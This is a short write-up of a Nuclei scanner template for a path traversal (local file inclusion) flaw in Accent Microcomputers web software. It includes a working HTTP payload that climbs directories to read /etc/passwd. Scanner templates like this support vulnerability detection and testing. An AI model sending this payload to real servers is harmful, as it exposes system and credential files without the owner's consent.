# Nuclei Template: Accent Microcomputers LFI
**Template ID:** accent-microcomputers-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`accent-microcomputers-lfi.yaml`)

## Vulnerability Information & PoC

## Description
A local file inclusion vulnerability in Accent Microcomputers offerings could allow remote attackers to retrieve password files.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?id=50&file=../../../../../../../../../etc/passwd
```

## References
- https://cxsecurity.com/issue/WLB-2018050036
- http://www.accent.com.pl
